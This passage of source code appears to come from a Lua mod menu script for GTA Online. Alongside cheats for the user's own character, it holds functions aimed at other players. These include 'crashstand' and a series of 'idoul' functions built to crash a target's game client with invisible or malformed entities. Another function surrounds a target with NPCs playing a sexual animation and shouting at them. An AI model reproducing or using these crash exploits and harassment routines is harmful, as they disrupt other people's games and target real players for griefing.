    end
    local create_axe = function(pos)
        local axe = entities.create_object(util.joaat("prop_ld_fireaxe"), pos)
        return {axe}
    end
    local delete_axe = function(axes)
        for _, axe in ipairs(axes) do
            ENTITY.DETACH_ENTITY(axe, true, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(axe, true, true)
            entities.delete_by_handle(axe)
        end
    end
    if 变量 then
        while 变量 do
            local pos = players.get_position(players.user())
            local right_hand_bone = PED.GET_PED_BONE_INDEX(players.user_ped(), 57005)
            if not generated then
                Axes = create_axe(pos)
                generated = true
            end
            if PAD.IS_CONTROL_JUST_PRESSED(0, 25) then 
                if not holding then
                    give_weapon_to_ped()
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(Axes[1], players.user_ped(), right_hand_bone, 0.08, 0, -0.02, -100, -180, -10, true, false, true, false, 0, true)
                    holding = true
                else
                    remove_weapon_from_ped()
                    delete_axe(Axes)
                    Axes = nil
                    generated = false
                    holding = false
                    thrown = false 
                end
            elseif PAD.IS_CONTROL_JUST_RELEASED(38, 38) then
                if Axes and holding then
                    request_anim("melee@unarmed@streamed_core")
                    TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                    ENTITY.DETACH_ENTITY(Axes[1])
                    ENTITY.SET_ENTITY_COLLISION(Axes[1], true, false)
                    ENTITY.SET_ENTITY_DYNAMIC(Axes[1], true)
                    ENTITY.SET_ENTITY_MAX_SPEED(Axes[1], 100.0)
                    local camrot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
                    ENTITY.SET_ENTITY_ROTATION(Axes[1], camrot.x, camrot.y, camrot.z, 1, false)
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(Axes[1], 1, 60, 2000, 100, true, true, true, true)
                    thrown = true  
                    throw_time = util.current_time_millis()  
                end
            elseif thrown then  
                if util.current_time_millis() - throw_time > delay then 
                    if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(Axes[1]) then
                        local axe_pos = ENTITY.GET_ENTITY_COORDS(Axes[1])
                        FIRE.ADD_EXPLOSION(axe_pos.x, axe_pos.y, axe_pos.z, 2, 1.0, true, false, 1.0)
                        delete_axe(Axes)
                        Axes = nil
                        generated = false
                        holding = false
                        thrown = false 
                    end
                end
            else
                if Axes and not holding then
                    request_ptfx_asset("scr_sum2_hal")
                    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
                    angle = angle + rotation_speed
                    local offsetX = math.cos(angle) * 1.5
                    local offsetY = math.sin(angle) * 1.5
                    local offsetZ = math.sin(angle * 2) * 0.3 * move_direction  
                    local newPos = {x = pos.x + offsetX, y = pos.y + offsetY, z = pos.z + offsetZ}
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                        "scr_sum2_hal_rider_weak_orange", Axes[1], 0, 0, offsetZ + 0.3, 0, 0, 0, 0.2, 0, 0, 0
                    )
                    ENTITY.SET_ENTITY_COLLISION(Axes[1], false, false)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Axes[1], newPos.x, newPos.y, newPos.z, false, false, false)
                    local rotX = 0
                    local rotY = math.sin(angle) * 3 
                    local rotZ = math.cos(angle) * 3  
                    ENTITY.SET_ENTITY_ROTATION(Axes[1], rotX, rotY, rotZ * newPos.y * rotation_speed * 5, 0, true)
                    if newPos.z > pos.z + 0.5 or newPos.z < pos.z - 0.5 then
                        move_direction = -move_direction
                    end
                end
            end
            wait() 
        end
    else
        if Axes then
            remove_weapon_from_ped()
            delete_axe(Axes)
            Axes = nil
            generated = false
            holding = false
            thrown = false
        end
    end
end
Freeing = 0
baseSpeed = 1
boostSpeed = 4
liftSpeed = 0.8 
descendSpeed = 0.8 
idleLiftSpeed = 0.004 
idleDirection = 1.5 
idleTimer = 0 
function Free_travel()
    local localmyPed = players.user_ped()
    local dpos = ENTITY.GET_ENTITY_COORDS(localmyPed)
    if Freeing == 0 then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(localmyPed)
        local FreeHash = 2193278353
        local cam_pay = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
        request_model(FreeHash)
        hasFree = entities.create_object(FreeHash, dpos)
        ENTITY.SET_ENTITY_VISIBLE(hasFree, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(localmyPed, hasFree, 0, 0, 0, 1.25, 0, 0, 0, false, false, false, false, 0, false)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(hasFree, false, false)
        ENTITY.SET_ENTITY_ROTATION(hasFree, 0, 0, cam_pay.z, 0, false)
        Freeing = 1
    elseif Freeing == 1 then
        local objPos = ENTITY.GET_ENTITY_COORDS(hasFree, false)
        local isBoost = util.is_key_down(0x10)
        local isLift = util.is_key_down(0x20) 
        local isDescend = util.is_key_down(0x11)
        local currentSpeed = isBoost and boostSpeed or baseSpeed
        local currentLiftSpeed = isLift and liftSpeed or (isDescend and -descendSpeed or 0)
        local hasMovementInput = false
        if util.is_key_down(0x44) or util.is_key_down(0x41) then
            hasMovementInput = true
            local camrot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
            ENTITY.SET_ENTITY_ROTATION(hasFree, 0, 0, camrot.z, 0, true)
            local forwardV = v3.new(math.cos(math.rad(camrot.z)), math.sin(math.rad(camrot.z)), 0.0)
            local delta = v3.new(forwardV)
            delta:mul(currentSpeed)
            if util.is_key_down(0x44) then
                local newPos = v3.new(objPos)
                newPos:add(delta)
                ENTITY.SET_ENTITY_COORDS(hasFree, newPos.x, newPos.y, newPos.z, false, false, false, false)
            elseif util.is_key_down(0x41) then
                local newPos = v3.new(objPos)
                newPos:sub(delta)
                ENTITY.SET_ENTITY_COORDS(hasFree, newPos.x, newPos.y, newPos.z, false, false, false, false)
            end
        end
        if util.is_key_down(0x53) or util.is_key_down(0x57) then
            hasMovementInput = true
            local camrot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
            ENTITY.SET_ENTITY_ROTATION(hasFree, 0, 0, camrot.z, 0, true)
            local rightV = v3.new(math.cos(math.rad(camrot.z + 90)), math.sin(math.rad(camrot.z + 90)), 0.0)
            local delta = v3.new(rightV)
            delta:mul(currentSpeed)
            if util.is_key_down(0x53) then
                local newPos = v3.new(objPos)
                newPos:sub(delta)
                ENTITY.SET_ENTITY_COORDS(hasFree, newPos.x, newPos.y, newPos.z, false, false, false, false)
            elseif util.is_key_down(0x57) then
                local newPos = v3.new(objPos)
                newPos:add(delta)
                ENTITY.SET_ENTITY_COORDS(hasFree, newPos.x, newPos.y, newPos.z, false, false, false, false)
            end
        end
        if isLift or isDescend then
            hasMovementInput = true
            local newPos = v3.new(objPos)
            newPos.z = newPos.z + currentLiftSpeed
            ENTITY.SET_ENTITY_COORDS(hasFree, newPos.x, newPos.y, newPos.z, false, false, false, false)
        end
        if not hasMovementInput then
            idleTimer = idleTimer + 1
            if idleTimer >= 120 then 
                idleDirection = -idleDirection
                idleTimer = 0
            end
            local idleLift = idleLiftSpeed * idleDirection
            local newPos = v3.new(objPos)
            newPos.z = newPos.z + idleLift
            ENTITY.SET_ENTITY_COORDS(hasFree, newPos.x, newPos.y, newPos.z, false, false, false, false)
        else
            idleTimer = 0 
        end
    end
end
function Cleanup_Free_travel()
    local localmyPed = players.user_ped()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(localmyPed)
    ENTITY.DETACH_ENTITY(localmyPed, true, false)
    if hasFree then
        entities.delete_by_handle(hasFree)
        hasFree = nil
    end
    Freeing = 0
end
--
local npcs = {} 
local monitoring = false
function create_npc_circle(pid)
    --local pid = PLAYER.PLAYER_ID()
    local pidcoods = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) pidcoods.z += 1
    local terror_model = 0x9CF26183
    request_model(terror_model)
    local radius1 = 0.6 
    local num_npcs1 = 10  
    create_npcs_in_circle(pidcoods, terror_model, radius1, num_npcs1)
    local pidcoodss = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local radius2 = 1.2 
    local num_npcs2 = 15 
    create_npcs_in_circle(pidcoodss, terror_model, radius2, num_npcs2)
end
function create_npcs_in_circle(center_coords, model, radius, num_npcs)
    local angle_step = 360 / num_npcs
    for i = 1, num_npcs do
        local angle = math.rad(i * angle_step)
        local x_offset = radius * math.cos(angle)
        local y_offset = radius * math.sin(angle)
        local spawn_coords = v3.new(center_coords.x + x_offset, center_coords.y + y_offset, center_coords.z - 1)
        local npc = CreatePed(26, model, spawn_coords, 0)
        ENTITY.FREEZE_ENTITY_POSITION(npc, true)
        request_anim("rcmpaparazzo_2")
        TASK.TASK_PLAY_ANIM(npc, "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, -1, 1, 0.0, false, false, false)
        local heading = MISC.GET_HEADING_FROM_VECTOR_2D(center_coords.x - spawn_coords.x, center_coords.y - spawn_coords.y)
        ENTITY.SET_ENTITY_HEADING(npc, heading)
        table.insert(npcs, npc)
    end
end
function delete_npcs()
    for _, npc in ipairs(npcs) do
        entities.delete_by_handle(npc)
    end
    npcs = {}
end
function monitor_player(pid)
    while monitoring do
        --local pid = PLAYER.PLAYER_ID()
        local pidcoods = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        if #npcs > 0 then
            local circle_center = ENTITY.GET_ENTITY_COORDS(npcs[1])
            AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(npcs[1], 'Provoke_Trespass')
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(npcs[1], 'Provoke_Trespass', 'Speech_Params_Force_Shouted_Critical', 1)
            local distance = MISC.GET_DISTANCE_BETWEEN_COORDS(pidcoods.x, pidcoods.y, pidcoods.z, circle_center.x, circle_center.y, circle_center.z, true)
            if distance > 10.0 then 
                delete_npcs()
                create_npc_circle(pid)
            end
        end
        wait() 
    end
end
--
function drawLine(from, to, r1, g1, b1, a1, r2, g2, b2, a2)
    local v2 = memory.alloc(8)
    local v4 = memory.alloc(8)
    if util.get_screen_coord_from_world_coord_no_adjustment(from.x, from.y, from.z, v2, v2 + 4) then
        if util.get_screen_coord_from_world_coord_no_adjustment(to.x, to.y, to.z, v4, v4 + 4) then
            directx.draw_line(memory.read_float(v2), memory.read_float(v2 + 4), memory.read_float(v4), memory.read_float(v4 + 4), r1, g1, b1, a1, r2, g2, b2, a2)
        end
    end
end
function ButtonMessage(text)--神宠
    GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
    GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
end
function AddControlInstruction(scaleform, index, control, message)
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_DATA_SLOT")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(index)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(2, control, true))
    ButtonMessage(message)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function laser_eyes_v6(playerPed)
    local coordsList = {
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, -1.0, 100.0, 1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 1.0, 100.0, 1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 1.0, 100.0, -1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, -1.0, 100.0, -1.0)
    }
    local coords0from = PED.GET_PED_BONE_COORDS(playerPed, 25260, 0.0, 0.0, 0.0)
    local coords1from = PED.GET_PED_BONE_COORDS(playerPed, 27474, 0.0, 0.0, 0.0)
    local coords0to = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 0.0, 100.0, 0.0)
    local HeatVision = util.joaat("WEAPON_RAILGUN")
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords0from.x, coords0from.y, coords0from.z, coords0to.x, coords0to.y, coords0to.z, 250, true, HeatVision, playerPed, false, true, 1.0)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords1from.x, coords1from.y, coords1from.z, coords0to.x, coords0to.y, coords0to.z, 250, true, HeatVision, playerPed, false, true, 1.0)
    GRAPHICS.DRAW_LINE(coords0from.x, coords0from.y, coords0from.z, coords0to.x, coords0to.y, coords0to.z, 0, 255, 0, 255)
    GRAPHICS.DRAW_LINE(coords1from.x, coords1from.y, coords1from.z, coords0to.x, coords0to.y, coords0to.z, 255, 0, 0, 255)
    for i = 1, #coordsList do
        local from = coordsList[i]
        local to = coordsList[(i % #coordsList) + 1]
        drawLinev1(from, to)
    end
end
function drawLinev1(from, to) -- 绘制线v1
    local v2 = memory.alloc(8)
    local v4 = memory.alloc(8)
    if util.get_screen_coord_from_world_coord_no_adjustment(from.x, from.y, from.z, v2, v2 + 4) then
        if util.get_screen_coord_from_world_coord_no_adjustment(to.x, to.y, to.z, v4, v4 + 4) then
            directx.draw_line(memory.read_float(v2), memory.read_float(v2 + 4), memory.read_float(v4), memory.read_float(v4 + 4), 0, 1, 1, 1, 1, 1, 0, 1)
        end
    end
end
function setupScaleform(scaleform)
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE(scaleform)
    while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
        util.yield(0)
    end
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "CLEAR_ALL")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_CLEAR_SPACE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(200)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AddControlInstruction(scaleform, 4, 32, "前进")
    AddControlInstruction(scaleform, 3, 51, "激光炮")
    AddControlInstruction(scaleform, 2, 21, "加速")
    AddControlInstruction(scaleform, 1, 25, "火焰")
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_BACKGROUND_COLOUR")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    return scaleform
end
function MaxVehicle(...)
    local Vehicle<const>, Version = ...
    if not Vehicle then
        return
    end
    Version = Version or 1
    VEHICLE.SET_VEHICLE_MOD_KIT(Vehicle, 0)
    if Version == 1 then
        for i = 0, 47 do
            local mod = VEHICLE.GET_NUM_VEHICLE_MODS(Vehicle, i)-1
            VEHICLE.SET_VEHICLE_MOD(Vehicle, i, mod, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(Vehicle, mod, true)
        end
        for j = 0, 20 do
            if VEHICLE.DOES_EXTRA_EXIST(Vehicle, j) then
                VEHICLE.SET_VEHICLE_EXTRA(Vehicle, j, true)
            end
        end
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(Vehicle, true)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(Vehicle, 1)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(Vehicle, 1)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(Vehicle, 'stand')
    elseif Version == 2 then
        local upgrades = {11, 12, 13, 15, 16}
        for i = 1, #upgrades do
            local mod = VEHICLE.GET_NUM_VEHICLE_MODS(Vehicle, upgrades[i])-1
            VEHICLE.SET_VEHICLE_MOD(Vehicle, upgrades[i], mod, true)
        end
        VEHICLE.TOGGLE_VEHICLE_MOD(Vehicle, 18, true)
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(Vehicle, true)
    end
end
function crashstand(pid)
    local pidpos = players.get_position(pid) pidpos.z = pidpos.z + 10
    pidpos.x = pidpos.x + 5
    for i = 1, 35 do
        local planea =  spawn_vehicle(562680400, pidpos, 0)
        MaxVehicle(planea)
        ENTITY.SET_ENTITY_INVINCIBLE(planea, true)
        ENTITY.FREEZE_ENTITY_POSITION(planea,true)
        ENTITY.SET_ENTITY_COLLISION(planea,false,false,true)
        VEHICLE.SET_DISABLE_VEHICLE_ENGINE_FIRES(planea,true)
        ENTITY.SET_ENTITY_VISIBLE(planea,false)
        local planepedb = CreatePed(6, util.joaat("s_m_y_swat_01"), pidpos,0)
        ENTITY.SET_ENTITY_INVINCIBLE(planepedb, true)
        ENTITY.SET_ENTITY_VISIBLE(planepedb,false)
        local planepedc = CreatePed(6,1702441027, pidpos,0)
        ENTITY.SET_ENTITY_INVINCIBLE(planepedc, true)
        ENTITY.SET_ENTITY_VISIBLE(planepedc,false)
        PED.SET_PED_INTO_VEHICLE(planepedb, planea, -1)
        PED.SET_PED_INTO_VEHICLE(planepedc, planea, 0)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(planepedc, 0xDBBD7280, 0, true)
        PED.SET_PED_COMBAT_ABILITY(planepedc, 200)
        PED.SET_PED_COMBAT_ATTRIBUTES(planepedc, 500, true)
        PED.SET_PED_COMBAT_RANGE(planepedc,2)
        TASK.TASK_COMBAT_PED(planepedc, PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 16)
        PED.SET_PED_RELATIONSHIP_GROUP_HASH(planepedc, util.joaat("HATES_PLAYER"))
    end
end
function start_particle_fx(ptfx_name, coord, rot, scale)
    GRAPHICS.USE_PARTICLE_FX_ASSET("weap_xs_weapons")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, coord.x, coord.y, coord.z, rot.x, rot.y, rot.z, scale, false, false, false)
end
function shoot_bullet(start_coord, end_coord, weapon_hash)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(
        start_coord.x, start_coord.y, start_coord.z, 
        end_coord.x, end_coord.y, end_coord.z, 
        100, true, weapon_hash, players.user_ped(), false, true, 100, players.user_ped(), 0
    )
end
function get_eye_bone_ids(ped_model)
    local left_eye_id, right_eye_id = 5956, 6468
    if ped_model == util.joaat("mp_f_freemode_01") or ped_model == util.joaat("mp_m_freemode_01") then
        left_eye_id, right_eye_id = 25260, 27474
    end
    return left_eye_id, right_eye_id
end
function laser_eyes_v1()
    local weapon_hash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    local ped = players.user_ped()
    local ped_model = ENTITY.GET_ENTITY_MODEL(ped)
    if util.is_key_down(0x02) then
        local cam_coord = CAM.GET_FINAL_RENDERED_CAM_COORD()
        local aim_vector = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
        local aim_dir = v3.toDir(aim_vector)
        v3.mul(aim_dir, 1000)
        v3.add(aim_dir, cam_coord)
        local left_eye_id, right_eye_id = get_eye_bone_ids(ped_model)
        local bone_coord_l = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(ped, PED.GET_PED_BONE_INDEX(ped, left_eye_id))
        local bone_coord_r = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(ped, PED.GET_PED_BONE_INDEX(ped, right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then
            bone_coord_l.z += 0.02
            bone_coord_r.z += 0.02
        end
        cam_rot.x += -90
        request_ptfx_asset(dictionary)
        start_particle_fx(ptfx_name, bone_coord_l, cam_rot, 2)
        start_particle_fx(ptfx_name, bone_coord_r, cam_rot, 2)
        shoot_bullet(bone_coord_l, aim_dir, weapon_hash)
        shoot_bullet(bone_coord_r, aim_dir, weapon_hash)
    end
end
function activate_laser_eyes()
    request_anim("skydive@parachute@")
    STREAMING.REQUEST_ANIM_SET("chute_idle_alt")
    TASK.TASK_PLAY_ANIM(players.user_ped(), "skydive@parachute@", "chute_idle_alt", 8.0, 8.0, -1, 1, 0.3, false, false, false)
    laser_eyes_v1()
end
function deactivate_laser_eyes()
    TASK.CLEAR_PED_TASKS(players.user_ped())
end
--
function idoula(pid)
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    pos.z = pos.z + 10
    request_model(util.joaat("A_M_Y_SouCent_04"))
    request_model(util.joaat("ninef2"))
    local A_M_Y_SouCent_04 <const> = entities.create_ped(-1, util.joaat("A_M_Y_SouCent_04"), pos, 0)
    local ninef2 <const> = entities.create_vehicle(util.joaat("ninef2"), pos, 0)
    ENTITY.SET_ENTITY_COLLISION(A_M_Y_SouCent_04, false)
    ENTITY.SET_ENTITY_COLLISION(ninef2,false)
    PED.SET_PED_INTO_VEHICLE(A_M_Y_SouCent_04, ninef2, -1)
    local time <const> = util.current_time_millis() + 5000
    while time > util.current_time_millis() do
        local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        pos.z = pos.z + 10
        TASK.TASK_VEHICLE_HELI_PROTECT(A_M_Y_SouCent_04, ninef2, PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 10.0, 0, 10, 0, 0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ninef2, pos.x, pos.y, pos.z)
        entities.give_control(A_M_Y_SouCent_04, pid)
        entities.give_control(ninef2, pid)
        if entities.get_owner(A_M_Y_SouCent_04) == pid and entities.get_owner(ninef2) == pid then
            wait(1000)
            entities.delete_by_handle(A_M_Y_SouCent_04)
            entities.delete_by_handle(ninef2)
            return
        end
        wait()
    end
    entities.delete_by_handle(A_M_Y_SouCent_04)
    entities.delete_by_handle(ninef2)
end
function idoulb(pid)
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    pos.z = pos.z + 20
    request_model(util.joaat("A_M_Y_SouCent_04"))
    request_model(util.joaat("ninef2"))
    local A_M_Y_SouCent_04 <const> = entities.create_ped(-1, util.joaat("A_M_Y_SouCent_04"), pos, 0)
    local ninef2 <const> = entities.create_vehicle(util.joaat("ninef2"), pos, 0)
    PED.SET_PED_INTO_VEHICLE(A_M_Y_SouCent_04, ninef2, -1)
    TASK.TASK_SUBMARINE_GOTO_AND_STOP(A_M_Y_SouCent_04, ninef2, 0, 0, 0, false)
    ENTITY.SET_ENTITY_COLLISION(A_M_Y_SouCent_04, false)
    ENTITY.SET_ENTITY_COLLISION(ninef2,false)
    local time <const> = util.current_time_millis() + 5000
    while time > util.current_time_millis() do
        local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        pos.z = pos.z + 20
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ninef2, pos.x, pos.y, pos.z)
        entities.give_control(A_M_Y_SouCent_04, pid)
        entities.give_control(ninef2, pid)
        if entities.get_owner(A_M_Y_SouCent_04) == pid and entities.get_owner(ninef2) == pid then
            wait(1000)
            entities.delete_by_handle(A_M_Y_SouCent_04)
            entities.delete_by_handle(ninef2)
            return
        end
        wait()
    end
    entities.delete_by_handle(A_M_Y_SouCent_04)
    entities.delete_by_handle(ninef2)
end
function idoulc(pid)
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    pos.z = pos.z + 10
    request_model(util.joaat("p_oil_pjack_02_s"))
    request_model(util.joaat("a_c_rat"))
    local spanw_ob <const> = entities.create_object(util.joaat("p_oil_pjack_02_s"), pos)
    local crash_ped_task <const> = entities.create_ped(-1, util.joaat("a_c_rat"), pos, 0)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(spanw_ob), false)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(crash_ped_task), false)
    ENTITY.SET_ENTITY_VISIBLE(spanw_ob, false)
    ENTITY.SET_ENTITY_VISIBLE(crash_ped_task, false)
    ENTITY.SET_ENTITY_COLLISION(spanw_ob, false)
    ENTITY.SET_ENTITY_COLLISION(crash_ped_task,false)
    ENTITY.FREEZE_ENTITY_POSITION(crash_ped_task, true)
    local time <const> = util.current_time_millis() + 5000
    while time > util.current_time_millis() do
        TASK.TASK_CLIMB_LADDER(crash_ped_task)
        wait(100)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(crash_ped_task)
    end
    entities.delete_by_handle(spanw_ob)
    entities.delete_by_handle(crash_ped_task)
end
function idould(pid)
    minitank = util.joaat("minitank")
    request_model(minitank)
    local ent <const> = entities.create_object(minitank, players.get_position(pid))
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(minitank), true)
    ENTITY.SET_ENTITY_VISIBLE(minitank, false)
    ENTITY.FREEZE_ENTITY_POSITION(minitank, false)
    ENTITY.SET_ENTITY_COLLISION(minitank, false)
    wait(1000)
    entities.delete_by_handle(ent)
end
function idoule(pid)
    local Basegame_Obj_Crash <const> = {
        "proc_forest_grass01",
        "prop_tall_grass_ba",
        "urbanweeds02_l1",
        "h4_prop_bush_buddleia_low_01",
        "h4_prop_bush_ear_aa",
        "h4_prop_bush_ear_ab",
        "h4_prop_bush_fern_low_01",
        "h4_prop_bush_fern_tall_cc",
        "h4_prop_bush_mang_low_aa",
        "h4_prop_bush_mang_ad",
        "h4_prop_bush_mang_low_ab",
        "h4_prop_bush_seagrape_low_01",
        "h4_prop_grass_med_01",
        "h4_prop_grass_tropical_lush_01",
        "h4_prop_grass_wiregrass_01",
        "h4_prop_weed_groundcover_01",
    }
    local Obj_Crash_1, Obj_Crash_2 <const> = {}, {}
        for i = 1, #Basegame_Obj_Crash do
            request_model(util.joaat(Basegame_Obj_Crash[i]))
            Obj_Crash_1[i] = entities.create_object(util.joaat(Basegame_Obj_Crash[i]), players.get_position(pid))
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Basegame_Obj_Crash[i]), false)
            ENTITY.SET_ENTITY_VISIBLE(Basegame_Obj_Crash[i], false)
            ENTITY.SET_ENTITY_COLLISION(Basegame_Obj_Crash[i], false)
        end
    wait(250)
    for i in ipairs(Obj_Crash_1) do
        entities.delete_by_handle(Obj_Crash_1[i])
    end
    for i in ipairs(Obj_Crash_2) do
        entities.delete_by_handle(Obj_Crash_2[i])
    end
end
function idoulf(pid)
    local pos <const> = players.get_position(pid)
    pos.z = pos.z + 10
    request_model(util.joaat("u_m_y_rsranger_01"))
    request_model(util.joaat("technical2"))
    local ranger <const> = entities.create_ped(-1, util.joaat("u_m_y_rsranger_01"), pos, 0)
    local technical <const> = entities.create_vehicle(util.joaat("technical2"), pos, 0)
    ENTITY.SET_ENTITY_COLLISION(ranger, false)
    ENTITY.SET_ENTITY_COLLISION(technical, false)
    PED.SET_PED_INTO_VEHICLE(ranger, technical, 1)
    local time <const> = util.current_time_millis() + 5000
    while time > util.current_time_millis() do
        local pos <const> = players.get_position(pid)
        pos.z = pos.z + 10
        TASK.SET_MOUNTED_WEAPON_TARGET(ranger, ranger, 0, 0.0, 0.0, 0.0, 5, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(technical, pos.x,pos.y,pos.z)
        entities.give_control(ranger, pid)
        entities.give_control(technical, pid)
        if entities.get_owner(ranger) == pid and entities.get_owner(technical) == pid then
            wait(1000)
            entities.delete_by_handle(ranger)
            entities.delete_by_handle(technical)
            return
        end
        wait()
    end
    entities.delete_by_handle(ranger)
    entities.delete_by_handle(technical)
end
function idoulg(pid)
    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(0, PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local save_pos <const> = players.get_position(players.user())
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), 10000, 10000, 2600)
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
    request_model(util.joaat("ig_lestercrest"))
    local ped_variation <const> = entities.create_ped(-1, util.joaat("ig_lestercrest"), players.get_position(pid), 0)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ped_variation), false)
    ENTITY.SET_ENTITY_COLLISION(ped_variation, false)
    PED.SET_PED_COMPONENT_VARIATION(ped_variation, 0, 0, 7, 0)
    local time <const> = util.current_time_millis() + 1000
    while time > util.current_time_millis() do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped_variation, players.get_position(pid).x, players.get_position(pid).y, players.get_position(pid).z)
        wait()
    end
    entities.delete_by_handle(ped_variation)
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), save_pos.x, save_pos.y, save_pos.z)
end
